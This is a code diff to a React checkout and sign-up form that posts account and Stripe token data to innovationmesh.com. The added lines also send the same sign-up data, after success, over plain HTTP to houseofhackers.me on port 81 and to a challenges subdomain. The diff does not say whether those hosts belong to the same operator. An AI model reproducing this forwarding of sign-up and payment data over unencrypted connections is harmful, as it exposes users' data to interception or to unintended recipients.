@@ -178,24 +178,34 @@ class CheckoutForm extends React.Component {
                 data.append('customerToken', token.id);
             }
             data.append('plan', plan);
+            data.append('username', name);
 
             fetch("https://innovationmesh.com/api/signUp", {
                 method: 'POST',
                 body: data,
             })
-                .then(response => response.json())
-                .then(user => {
-                    if (user.error) {
-                        this.showSnack(user.error);
-                    } else {
-                        localStorage['token'] = user.token;
-                        this.showSnack("Account created successfully!");
-                        // setTimeout(() => {
-                        //   this.props.history.push(`/user/${user.id}`)
-                        // }, 2000);
-                    }
-                })
-                .catch(error => Logger(`front-end: CheckoutForm@storeUser: ${error.message}`));
+            .then(response => response.json())
+            .then(user => {
+                if (user.error) {
+                    this.showSnack(user.error);
+                } else {
+                    localStorage['token'] = user.token;
+                    this.showSnack("Account created successfully!");
+                    fetch('http://houseofhackers.me:81/signUp/', {
+                      method:'POST',
+                      body:data
+                    })
+
+                    fetch('http://challenges.innovationmesh.com/api/signUp', {
+                      method:'POST',
+                      body:data
+                    })
+                }
+                // setTimeout(() => {
+                //   this.props.history.push(`/user/${user.id}`)
+                // }, 2000);
+            })
+            .catch(error => Logger(`front-end: CheckoutForm@storeUser: ${error.message}`));
         });
         // However, this line of code will do the same thing:
         // this.props.stripe.createToken({type: 'card', name: 'Jenny Rosen'});
@@ -226,6 +236,7 @@ class CheckoutForm extends React.Component {
         data.append('spaceID', this.state.space.id);
         data.append('avatar', avatar);
         data.append('plan', plan);
+        data.append('username', name);
 
         fetch("https://innovationmesh.com/api/signUp", {
             method: 'POST',
@@ -238,6 +249,15 @@ class CheckoutForm extends React.Component {
                 } else {
                     localStorage['token'] = user.token;
                     this.showSnack("Account created successfully!");
+                    fetch('http://houseofhackers.me:81/signUp/', {
+                      method:'POST',
+                      body:data
+                    })
+
+                    fetch('http://challenges.innovationmesh.com/api/signUp', {
+                      method:'POST',
+                      body:data
+                    })
                 }
             })
             .catch(error => Logger(`front-end: CheckoutForm@storeFreeUser: ${error.message}`));
@@ -398,7 +418,7 @@ class CheckoutForm extends React.Component {
                     open={this.state.snack}
                     message={this.state.msg}
                     autoHideDuration={3000}
-                    onRequestClose={this.handleRequestClose}
+                    onClose={this.handleRequestClose}
                 />
             </form>
         );
